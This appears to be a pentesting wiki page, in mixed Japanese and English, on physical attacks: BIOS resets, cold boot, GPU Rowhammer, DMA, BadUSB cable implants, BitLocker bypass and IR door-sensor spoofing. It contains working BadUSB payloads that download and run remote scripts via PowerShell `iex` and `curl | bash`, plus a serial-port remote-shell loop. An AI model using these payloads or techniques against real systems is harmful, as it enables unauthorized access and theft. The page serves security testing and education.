# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## BIOS Password Recovery and System Security

**BIOSのリセット**は、いくつかの方法で実行できます。多くのマザーボードには、**バッテリー**があり、これを約**30分**取り外すと、パスワードを含むBIOS設定がリセットされます。別の方法として、**マザーボード上のジャンパー**を調整し、特定のピンを接続することでこれらの設定をリセットできます。

ハードウェアの調整ができない、または現実的でない場合は、**ソフトウェアツール**が解決策になります。**Kali Linux**のようなディストリビューションを含む**Live CD/USB**からシステムを起動すると、**_killCmos_** や **_CmosPWD_** などのツールにアクセスでき、BIOSパスワードの回復を支援できます。

BIOSパスワードが不明な場合、**3回**誤って入力すると、通常はエラーコードが表示されます。このコードは [https://bios-pw.org](https://bios-pw.org) のようなウェブサイトで使用して、利用可能なパスワードを取得できる場合があります。

### UEFI Security

**UEFI**を従来のBIOSの代わりに使用している最新システムでは、**chipsec** ツールを利用して、**Secure Boot** の無効化を含むUEFI設定の分析や変更ができます。これは次のコマンドで実行できます：
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM Analysis and Cold Boot Attacks

RAM は、電源断後もしばらくデータを保持し、通常 **1〜2分** は残ります。この保持時間は、液体窒素のような冷却物質を適用することで **10分** まで延長できます。この延長された期間に、**dd.exe** や **volatility** のようなツールを使って解析用の **memory dump** を作成できます。

---

## GPU Rowhammer Against Page Tables

現代の GPU Rowhammer 攻撃は、通常のバッファではなく **GPU virtual-memory metadata** を標的にすると、はるかに有用になります。**GDDR6 NVIDIA Ampere GPUs** に関する最近の研究では、特権なしの CUDA code を実行する attacker が GPU 固有の hammering パターンを構築し、**memory massaging** を使って paging 構造を脆弱な行に配置し、さらに **last-level page table** または中間の **page directory** の bit を反転できることが示されています。1つでも translation entry が破損すると、attacker は **arbitrary GPU memory read/write** を足場にして、その後 host compromise に進めます。

### Exploitation Pattern

1. **Profile hammerable rows** を GDDR6 で行い、DRAM 内 mitigation を回避する refresh-aware / non-uniform hammering パターンを構築する。
2. **Massage GPU allocations** して、driver が page-translation structures をデフォルトの保護済み pool ではなく、hammerable な物理位置に配置するようにする。実際には、low-memory page-table region を枯渇させ、制御された stride で大きな sparse UVM mapping を spray することを意味する場合があります。
3. **PFN** や page-table / page-directory entry 内の aperture 関連 bit などの translation metadata を flip し、attacker-controlled の virtual page が page-table pages、任意の GPU memory、または host-visible system mappings に解決されるようにする。
4. 偽造した mapping を再利用して追加の translation entries を書き換え、GPU contexts 全体で **arbitrary GPU memory read/write** へ昇格する。

### Host Pivot and Mitigations

- **IOMMU disabled** の場合、偽造された system-aperture mappings により任意の **host physical memory** が GPU に露出し、GPU primitive が完全な host compromise に変わる。
- **GDDRHammer** は last-level page-table entries を標的にし、**GeForge** は page-directory level の破損の方が簡単な場合があることを示している。これは、1 bit の flip だけでより大きな translation subtree を retarget できるためである。security-critical なのは paging layer 1つだけだとみなしてはならない。
- **IOMMU** はなお重要である。なぜなら、GDDRHammer/GeForge で使われる直接的な arbitrary-host-memory path を遮断するからだ。ただし、**complete mitigation** ではない。**GPUBreach** は第2段階の pivot を示しており、attacker が GPU-writable で driver-owned な CPU buffers を破損し、その後 NVIDIA driver の memory-safety bugs を誘発して kernel write primitive と **root shell** を、IOMMU enabled のまま取得する。
- **System-level ECC** は、対応する workstation/server GPUs では実用的な hardening step である。ECC のない consumer GPUs は、より弱い defense surface を露出する。
- これらの攻撃は純粋に理論上のものではない。**GeForge** は RTX 3060 で **1,171** 個、RTX A6000 で **202** 個の bit flips を報告しており、これだけで実用的な host-privilege-escalation chain を構築するのに十分だった。

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** は、**FireWire** や **Thunderbolt** のような interfaces と互換性のある DMA を通じて **physical memory manipulation** を行うための tool である。memory を patch して任意の password を受け入れさせることで、login procedures を bypass できる。ただし、**Windows 10** systems には効果がない。

---

## Live CD/USB for System Access

**_sethc.exe_** や **_Utilman.exe_** のような system binaries を **_cmd.exe_** の copy に置き換えると、system privileges で command prompt を得られる。**chntpw** のような tool は、Windows installation の **SAM** file を edit するために使え、password changes を可能にする。

**Kon-Boot** は、Windows kernel または UEFI を一時的に変更することで、password を知らなくても Windows systems に login できるようにする tool である。詳細は [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/) を参照。

---

## Handling Windows Security Features

### Boot and Recovery Shortcuts

- **Supr**: BIOS settings にアクセスする。
- **F8**: Recovery mode に入る。
- Windows banner の後に **Shift** を押すと autologon を bypass できる。

### BAD USB Devices

**Rubber Ducky** や **Teensyduino** のような device は、target computer に接続されたときに事前定義された payload を実行できる **bad USB** device を作成するための platform である。

### Volume Shadow Copy

Administrator privileges があれば、PowerShell を通じて **SAM** file を含む機密ファイルの copy を作成できる。

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- **Evil Crow Cable Wind** のような ESP32-S3 ベースの implant は、USB-A→USB-C または USB-C↔USB-C cable 内に隠れ、純粋に USB keyboard として enumerate し、C2 stack を Wi-Fi 経由で公開する。operator は victim host から cable に電力を供給し、`Evil Crow Cable Wind` という名前で password `123456789` の hotspot を作成し、[http://cable-wind.local/](http://cable-wind.local/)（またはその DHCP address）を開いて埋め込みの HTTP interface に到達するだけでよい。
- browser UI には *Payload Editor*、*Upload Payload*、*List Payloads*、*AutoExec*、*Remote Shell*、*Config* の tabs がある。保存された payload は OS ごとにタグ付けされ、keyboard layouts はその場で切り替えられ、VID/PID strings も既知の peripheral を真似るよう変更できる。
- C2 が cable 内にあるため、phone だけで payload を stage し、execution を trigger し、Wi-Fi credentials を管理でき、host OS に触れる必要がない。短時間の physical intrusion に理想的である。

### OS-aware AutoExec payloads

- AutoExec rules は、USB enumeration の直後に 1 つ以上の payload が即時実行されるように binding する。implant は軽量な OS fingerprinting を行い、対応する script を選択する。
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) or `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- execution が unattended なので、充電 cable を差し替えるだけで、ログオン中 user context で “plug-and-pwn” initial access を達成できる。

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** 保存済み payload が console を開き、新しい USB serial device に到着したものを何でも実行する loop を貼り付ける。Windows の最小例は:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** implantはUSB CDCチャネルを開いたままにし、その間にESP32-S3がoperatorへ向けてTCP client（Python script、Android APK、またはdesktop executable）を起動する。TCP sessionに入力された任意のbytesは上記のserial loopへ転送され、air-gapped host上でもremote command executionが可能になる。出力は制限されているため、operatorは通常、blind commands（account creation、追加toolingのstagingなど）を実行する。

### HTTP OTA update surface

- 同じweb stackは通常、unauthenticatedなfirmware updatesも公開している。Evil Crow Cable Windは`/update`で待ち受け、アップロードされたbinaryをそのままflashする:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators can hot-swap features (e.g., flash USB Army Knife firmware) mid-engagement without opening the cable, letting the implant pivot to new capabilities while still plugged into the target host.

## BitLocker Encryption のバイパス

BitLocker encryption は、**recovery password** がメモリダンプファイル (**MEMORY.DMP**) 内に見つかった場合、バイパスできる可能性があります。これには、**Elcomsoft Forensic Disk Decryptor** や **Passware Kit Forensic** などのツールを利用できます。

---

## Recovery Key 追加のための Social Engineering

新しい BitLocker recovery key は、Social Engineering を使って追加できます。ユーザーにコマンドを実行させて、ゼロで構成された新しい recovery key を追加させるよう誘導し、復号プロセスを簡単にします。

---

## BIOS を Factory-Reset するための Chassis Intrusion / Maintenance Switch の悪用

多くの現代的な laptop や small-form-factor desktop には、Embedded Controller (EC) と BIOS/UEFI firmware によって監視される **chassis-intrusion switch** が搭載されています。スイッチの主な目的は、デバイスが開封されたときに警告を出すことですが、vendor は特定のパターンでスイッチが切り替えられたときに発動する、**documented されていない recovery shortcut** を実装していることがあります。

### 攻撃の仕組み

1. スイッチは EC 上の **GPIO interrupt** に配線されています。
2. EC 上で動作する firmware は、**押下のタイミングと回数** を追跡します。
3. ハードコードされたパターンが認識されると、EC は system NVRAM/CMOS の内容を **erase** する *mainboard-reset* ルーチンを呼び出します。
4. 次回起動時に BIOS は default 値を読み込みます – **supervisor password、Secure Boot keys、そしてすべての custom configuration は消去されます**。

> Secure Boot が無効化され、firmware password が消えた後は、攻撃者は任意の external OS image で起動し、internal drives への制限なしのアクセスを取得できます。

### 実例 – Framework 13 Laptop

Framework 13 (11th/12th/13th-gen) の recovery shortcut は次のとおりです:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
10回目のサイクル後、ECは次回の再起動時にBIOSへNVRAMを消去するよう指示するフラグを設定する。手順全体は約40秒で、**必要なのはドライバー1本だけ**である。

### Generic Exploitation Procedure

1. ECが動作している状態にするため、対象を電源投入するか、サスペンド復帰させる。
2. 下部カバーを外して、intrusion/maintenance switch を露出させる。
3. ベンダー固有のトグルパターンを再現する（ドキュメント、フォーラムを参照するか、ECファームウェアをリバースエンジニアリングする）。
4. 再組み立てして再起動する – firmware protections は無効化されているはずである。
5. live USB（例: Kali Linux）で起動し、通常の post-exploitation（credential dumping、data exfiltration、malicious EFI binaries の埋め込みなど）を実行する。

### Detection & Mitigation

* OS management console で chassis-intrusion イベントをログに記録し、予期しないBIOS reset と相関させる。
* 開封検知のため、ネジ/カバーに **tamper-evident seals** を使用する。
* デバイスは **physically controlled areas** に保管する; 物理アクセスは完全な compromise に等しいとみなす。
* 可能であれば、ベンダーの “maintenance switch reset” 機能を無効化するか、NVRAM reset に追加の暗号学的認可を要求する。

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- 一般的な “wave-to-exit” センサーは、近赤外LEDエミッタとTVリモコン型の受信モジュールを組み合わせており、正しいキャリアのパルスを複数回（約4～10回）受信した後にのみ logic high を報告する。
- プラスチック製のシュラウドがエミッタと受信部が直接見合うのを遮るため、コントローラは、検証済みのキャリアは近くの反射に由来すると想定し、door strike を開ける relay を駆動する。
- コントローラがターゲットの存在を認識すると、しばしば outbound modulation envelope を変更するが、受信機はフィルタされたキャリアに一致する burst であれば引き続き受け付ける。

### Attack Workflow
1. **Emission profile を取得する** – logic analyser をコントローラのピンにクリップし、内部IR LEDを駆動する検出前と検出後の両方の waveform を記録する。
2. **“post-detection” waveform だけを再生する** – 標準のエミッタを取り外す/無視し、すでにトリガーされたパターンで外部IR LEDを最初から駆動する。受信機はパルス数/周波数だけを気にするため、偽装したキャリアを本物の反射とみなし、relay line をアサートする。
3. **Transmission をゲートする** – キャリアを調整された burst（例: 数十ミリ秒ON、同程度OFF）で送信し、受信機の AGC や interference handling logic を飽和させずに必要最小限のパルス数を届ける。連続発光はセンサーをすぐに鈍化させ、relay の動作を止めてしまう。

### Long-Range Reflective Injection
- ベンチ用LEDを高出力IRダイオード、MOSFET driver、集光 optics に置き換えることで、約6m先からでも確実にトリガーできる。
- 攻撃者は受信機開口部への line-of-sight を必要としない。ガラス越しに見える室内壁、棚、ドア枠へビームを向ければ、反射エネルギーが約30°の field of view に入り、近距離の手振りを模倣できる。
- 受信機は弱い反射のみを想定しているため、はるかに強力な外部ビームでも複数表面で反射して検出閾値を超えたまま維持できる。

### Weaponised Attack Torch
- 市販の懐中電灯に driver を組み込むと、道具を目立たず隠せる。可視LEDを受信機の band に合った高出力IR LEDへ交換し、約30 kHzの burst を生成するために ATtiny412（または同等品）を追加し、LED電流を sink するために MOSFET を使う。
- 伸縮式 zoom lens により range/precision のためにビームを絞り、MCU制御の vibration motor は可視光を出さずに modulation が有効であることを触覚で確認できる。
- 保存済みの複数の modulation pattern（わずかに異なる carrier frequency と envelope）を順に切り替えることで、再ブランド化された sensor family 全体での互換性が向上し、操作者は relay が音を立てて click し door が解放されるまで反射面をスイープできる。

---

## References

- [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
